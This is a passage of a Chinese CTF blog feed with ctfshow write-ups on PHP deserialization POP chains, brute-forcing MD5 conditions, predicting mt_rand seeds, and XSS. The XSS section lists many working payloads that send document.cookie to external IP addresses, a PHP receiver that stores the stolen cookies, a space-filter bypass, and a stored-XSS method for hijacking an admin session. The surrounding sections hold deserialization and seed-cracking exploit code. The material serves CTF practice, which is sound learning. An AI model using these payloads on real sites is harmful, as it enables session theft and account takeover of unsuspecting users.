pop"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先反序列化可以自己增加（删除）参数和值，即使原本没有参数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然B中没有定义a，但是也照样可以在exp中给B-&gt;a赋值，进行反序列化</p><p>exp.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Fun</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'call_user_func_array'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fun</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token string single-quoted-string">'Test::getFlag'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$fun</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r1</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"Fun":1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'"Fun":2:'</span><span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绕过__wakeup</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$r1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常规思路中我们的pop链是B→A→Fun→Test，可是B里的<code>__destruct()</code>方法貌似没有主动触发。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破</title>
      <link href="/2022/09/08/bao-po/"/>
      <url>/2022/09/08/bao-po/</url>
      
        <content type="html"><![CDATA[<h2 id="加密的爆破"><a href="#加密的爆破" class="headerlink" title="加密的爆破"></a>加密的爆破</h2><p>BP这个版块可以进行简单的加密</p><p><img src="/images/image-20220806215735962-1662567265569.png" alt="image-20220806215735962"></p><h2 id="爆破解密"><a href="#爆破解密" class="headerlink" title="爆破解密"></a>爆破解密</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">50000</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\t"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果种子固定可以推出每一个值</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> Linux version 5.4.0-121-generic (buildd@lcy02-amd64-013) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 Linux version 5.4.0-121-generic (buildd@lcy02-amd64-013) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果种子固定可以通过某个随机值，反推种子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Linux version <span class="token number">5.4</span><span class="token number">.0</span><span class="token operator">-</span><span class="token number">121</span><span class="token operator">-</span><span class="token function">generic</span> <span class="token punctuation">(</span>buildd@lcy02<span class="token operator">-</span>amd64<span class="token operator">-</span><span class="token number">013</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version <span class="token number">9.4</span><span class="token number">.0</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">9.4</span><span class="token number">.0</span><span class="token operator">-</span><span class="token number">1</span>ubuntu1<span class="token operator">~</span><span class="token number">20.04</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 Linux version 5.4.0-121-generic (buildd@lcy02-amd64-013) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>?r&#x3D;0,得到第一次的随机数</p><p>利用php_mt_seed漏洞脚本</p><p><img src="/images/image-20220806225723097-1662567265570.png" alt="image-20220806225723097"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2022/09/08/xss/"/>
      <url>/2022/09/08/xss/</url>
      
        <content type="html"><![CDATA[<h2 id="窃取靶机的Cookies"><a href="#窃取靶机的Cookies" class="headerlink" title="窃取靶机的Cookies"></a>窃取靶机的Cookies</h2><p>注意不是<strong>本机的Cookies</strong></p><p>使用 document.cookie 获取cookie</p><p>使用document.location.href&#x3D;’’等进行请求</p><h2 id="发射型"><a href="#发射型" class="headerlink" title="发射型"></a>发射型</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> img<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"img"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://118.31.168.198:39543/"</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://175.178.196.226/xssget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://175.178.196.226/xxxget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://175.178.196.226/xssget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://175.178.196.226/xssget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://175.178.196.226/xssget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://175.178.196.226/xssget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://175.178.196.226/xssget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="接收脚本："><a href="#接收脚本：" class="headerlink" title="接收脚本："></a>接收脚本：</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>onload<span class="token operator">=</span><span class="token string">"document.location.href='http://175.178.196.226/xxxget.php?data='+document.cookie"</span><span class="token operator">></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://175.178.196.226/xxxget.php?data='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>也可以使用上面的payload</p><p>使用XSS平台 <a href="https://xss.pt/xss.php?do=project&amp;act=viewcode&amp;id=58130&amp;h=2&amp;k=2">https://xss.pt/xss.php?do=project&amp;act=viewcode&amp;id=58130&amp;h=2&amp;k=2</a> </p><p><img src="/images/image-20220902002628270-1662567214810.png" alt="image-20220902002628270"></p><p>用户登录后：</p><p><img src="/images/image-20220902101858265-1662567214810.png" alt="image-20220902101858265"></p><p>发现管理员可以查看的东西，可以在上面置入XSS脚本，进行跳转</p><p>用户名和密码中全部使用：</p><p><code>&lt;script&gt;document.location.href=&#39;http://175.178.196.226/xxxget.php?data=&#39;+document.cookie&lt;/script&gt;</code></p><p>后台管理员查看时，就会获得后台管理员的session，然后就可以登录进管理员</p><p><code>PHPSESSID=h6n4qsvpqfr18dem67ed7ao4ue</code></p><p>也可以直接获取管理员页面的html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>innerHTML<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'ctf'</span><span class="token operator">+</span><span class="token string">'show&#123;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://175.178.196.226/xxxget.php?data='</span><span class="token operator">+</span>value<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" 